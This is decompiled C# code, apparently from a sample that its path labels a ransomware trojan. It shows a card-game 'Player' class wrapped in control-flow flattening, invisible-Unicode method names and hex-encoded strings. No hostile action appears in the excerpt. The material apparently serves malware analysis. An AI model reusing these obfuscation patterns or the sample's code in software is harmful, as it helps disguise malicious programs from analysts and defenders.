// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: RuntimeParameterIn, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: E46F8FBF-E963-420D-9D24-515F2113904E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-899a15627241e59e9347d18a6286ac2587425c3cd941d6b095f01d1a9205dac5.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
label_1:
      int num1 = -800400198;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1775128573)) % 10U)
        {
          case 0:
            str1 = "45766964656E6365547970654465736372697074";
            num1 = (int) num2 * -343060729 ^ -2055027146;
            continue;
          case 1:
            flag = BaseStream == 0;
            num1 = (int) num2 * 187128292 ^ -202583385;
            continue;
          case 2:
            str1 = "5866754742327A75";
            num1 = (int) num2 * -2138577790 ^ 1485382636;
            continue;
          case 3:
            goto label_1;
          case 4:
            int num3 = !flag ? 1888292004 : (num3 = 694981786);
            num1 = num3 ^ (int) num2 * -221735469;
            continue;
          case 5:
            str2 = str1;
            num1 = -1509215355;
            continue;
          case 6:
            num1 = (int) num2 * -848190583 ^ -320422167;
            continue;
          case 7:
            num1 = (int) num2 * 1435897934 ^ 213473363;
            continue;
          case 9:
            int num4;
            num1 = num4 = BaseStream != 1 ? -670837676 : (num4 = -1505231649);
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -1115877936;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -686136730)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * -248322677 ^ -2074608458;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = -173508595;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 147218282;
        int num2;
        bool flag;
        int[] planningCards;
        int index;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 1480392230)) % 14U)
          {
            case 0:
              planningCardsCount = num3;
              num1 = (int) num4 * 1129717416 ^ 2002797021;
              continue;
            case 1:
              num2 = planningCards[index];
              num1 = 1951849146;
              continue;
            case 2:
              goto label_1;
            case 3:
              num1 = (int) num4 * -2072834865 ^ -1095306864;
              continue;
            case 4:
              ++num3;
              num1 = (int) num4 * -276086469 ^ 472995583;
              continue;
            case 5:
              int num5 = flag ? 1586811719 : (num5 = 87696874);
              num1 = num5 ^ (int) num4 * -755326817;
              continue;
            case 6:
              index = 0;
              num1 = (int) num4 * -1308479325 ^ -463875787;
              continue;
            case 7:
              num1 = (int) num4 * 279915671 ^ -1373083998;
              continue;
            case 8:
              ++index;
              num1 = (int) num4 * -152328457 ^ 778801277;
              continue;
            case 10:
              flag = num2 > 0;
              num1 = (int) num4 * -1666852773 ^ 1976008467;
              continue;
            case 11:
              num1 = 1287190848;
              continue;
            case 12:
              num3 = 0;
              planningCards = this.PlanningCards;
              num1 = (int) num4 * 902407254 ^ 1934351918;
              continue;
            case 13:
              int num6;
              num1 = num6 = index >= planningCards.Length ? 26742544 : (num6 = 1519509323);
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 1399805122;
      int index;
      int planningCard;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1286164249)) % 12U)
        {
          case 0:
            num1 = (int) num2 * 2010677714 ^ -33068843;
            continue;
          case 1:
            num1 = (int) num2 * -1918341425 ^ 1821336207;
            continue;
          case 2:
            str1 = Player.\u206D‫⁫‫‌‍‮‎‏‎⁫⁯​⁬‍‫⁭⁭⁪‌‮‎⁮‌‎‭​⁪⁯​⁫‮‫‫⁫‍⁪​​‬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 1723511448;
            continue;
          case 3:
            num1 = 1638064685;
            continue;
          case 5:
            ++index;
            num1 = 413719736;
            continue;
          case 6:
            goto label_1;
          case 7:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * 2013583605 ^ -1087525841;
            continue;
          case 8:
            planningCard = this.PlanningCards[index];
            flag = planningCard == 0;
            num1 = (int) num2 * -1254478779 ^ 1827005754;
            continue;
          case 9:
            int num3;
            num1 = num3 = index >= this.PlanningCards.Length ? 713239215 : (num3 = 1299542554);
            continue;
          case 10:
            str2 = str1;
            num1 = (int) num2 * 1382762484 ^ -986219763;
            continue;
          case 11:
            int num4 = !flag ? 1339980816 : (num4 = 467219191);
            num1 = num4 ^ (int) num2 * 1258535889;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = -1806832076;
      int aIndex;
      bool flag;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1005343404)) % 10U)
        {
          case 0:
            flag = aIndex < count;
            num1 = -1360711313;
            continue;
          case 1:
            aIndex = 0;
            num1 = (int) num2 * 207696477 ^ 1296222777;
            continue;
          case 2:
            numArray = new int[count];
            num1 = (int) num2 * 1558993729 ^ 1942829555;
            continue;
          case 3:
            ++aIndex;
            num1 = (int) num2 * 2136481027 ^ 763197769;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * 1654702296 ^ -666292506;
            continue;
          case 7:
            int num3 = !flag ? 1214829501 : (num3 = 2105883400);
            num1 = num3 ^ (int) num2 * 1101266244;
            continue;
          case 8:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -658792131;
            continue;
          case 9:
            planningCards = numArray;
            num1 = (int) num2 * -1204944875 ^ -651490722;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
      string str = Player.\u202E​⁫⁬‭‪‪‏​‪‫‍‍‍⁮‬⁬⁯⁫⁪⁭‫‍‭⁪‍⁯‎⁬⁬⁫⁮‍⁮‎‍‍⁭‫‪‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
label_1:
      int num1 = 1836294818;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1087078539)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -640920373 ^ -1992505680;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u206D‫⁫‫‌‍‮‎‏‎⁫⁯​⁬‍‫⁭⁭⁪‌‮‎⁮‌‎‭​⁪⁯​⁫‮‫‫⁫‍⁪​​‬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202E​⁫⁬‭‪‪‏​‪‫‍‍‍⁮‬⁬⁯⁫⁪⁭‫‍‭⁪‍⁯‎⁬⁬⁫⁮‍⁮‎‍‍⁭‫‪‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
